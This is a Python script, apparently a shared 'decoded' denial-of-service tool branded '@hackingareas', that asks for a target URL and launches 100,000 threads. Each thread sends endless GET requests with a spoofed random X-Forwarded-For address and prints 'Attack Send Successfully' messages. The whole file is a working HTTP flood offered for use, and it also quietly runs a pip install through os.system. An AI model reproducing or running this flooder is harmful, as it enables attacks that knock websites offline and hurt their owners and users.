
import threading
import requests
import os
import time
import sys
import webbrowser,pyfiglet
from fake_useragent import UserAgent
from random import *

E = '\033[1;31m'
B = '\033[2;36m'
G = '\033[1;32m'
S = '\033[1;33m'
F = '\033[1;32m'  # Ø§Ø®Ø¶Ø±
B = "\033[1;30m"  # Black
R = "\033[1;31m"  # Red
G = "\033[1;32m"  # Green
Y = "\033[1;33m"  # Yellow
Bl = "\033[1;34m"  # Blue
P = "\033[1;35m"  # Purple
C = "\033[1;36m"  # Cyan
W = "\033[1;37m"  # White
PN = "\033[1;35m"  # PINK
L = '\033[1;33m' #اصفر
C = "\033[1;97m" #ابيض
B = '\033[2;36m'#سمائي
Y = '\033[1;34m' #ازرق فاتح.
C = "\033[1;97m" #ابيض
X = '\037' #ابيض
G = '\033[1;32m'
R = '\033[1;31m'
X='\033[1;30m'
XX="\x1b[38;5;196m"
GGG="\x1b[38;5;214m"
from websocket  import create_connection
os.system('pip install websocket-client')
 
print(f"""\x1b[1;38;5;121m
⠀⠀⠀⠀⣀⣤⣤⣶⣾⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣶⣶⣦⣤⣀⠀⠀⠀⠀⠀
⣀⣴⣶⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣴⣿⣿⣿⣿⣿⣿⣷⣦⣄⡀
⠁⠀⠀⠈⠉⠛⣿⣿⣿⣿⣿⣷⣦⣀⢠⣆⣸⡆⢀⣤⣾⣿⣿⣿⣿⣿⠟⠋⠉⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠸⠿⠿⠿⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠿⠿⠏⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⣿⣿⣿⣿⠿⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀          
{G}⋆{GGG}\x1b[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{G}⋆
\x1b[1;92m {XX}[\x1b[1;92m⍣{XX}]\x1b[38;5;46m DECODER    \x1b[1;97m ● \x1b[1;92m@hackingareas
\x1b[1;92m {XX}[\x1b[1;92m⍣{XX}] \x1b[38;5;47mECNCRYPTER \x1b[1;97m● \x1b[1;92mANDYZ    
\x1b[1;92m {XX}[\x1b[1;92m⍣{XX}]\x1b[38;5;48m INFO   \x1b[1;97m    ● \x1b[1;92mDDOS
\x1b[1;92m {XX}[\x1b[1;92m⍣{XX}] \x1b[38;5;47mTOOLS     \x1b[1;97m ● \x1b[1;92mFREE & DEC BY JOKER
\x1b[1;92m {XX}[\x1b[1;92m⍣{XX}] \x1b[38;5;47mVERSION   \x1b[1;97m ● \x1b[1;92mNULL                 
{G}⋆{GGG}\x1b[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{G}⋆""")
print('DeCoDeD By hacking areas > @hackingareas')
list = [2,2,2,2]
concate = '.'
list[0] = str(randrange(11,197))
list[1] = str(randrange(1,255))
list[2] = str(randrange(1,255))
list[3] = str(randrange(2,253))
port = str(randrange(11111,999999))
ip = list[0]+concate+list[1]+concate+list[2]+concate+list[3]+':'+port


def send_request(url):
    while True:
        try:
            headers = {
            "X-Forwarded-For":ip
            }
            response = requests.get(url,headers=headers)
            url = url.strip("/")
            if response.status_code==200:
                print(f"{PN}Attack Send Successfully To: {G}[{B}{url}{G}] [{Y}Response:{C}{response.status_code}{G}]")
            else:
                print(f"{PN}Attack Send Successfully To: {G}[{XX}{url}{G}] [{Y}Response:{R}{response.status_code}{G}]")
        except requests.exceptions.RequestException as e:
            print(f"Error sending attack to {url} : {e}")

def launch_attack(url, num_threads):
    for _ in range(num_threads):
        threading.Thread(target=send_request, args=(url,)).start()

if __name__ == "__main__":
    target_url = input("\033[36;mENTER THE LINK =>> \033[32;m")
    print(('—'*25)+f'\n•{GGG} DeCoD By: {C}@hackingareas  {G}•\n'+('—'*25))
    num_threads = 100000

    launch_attack(target_url, num_threads)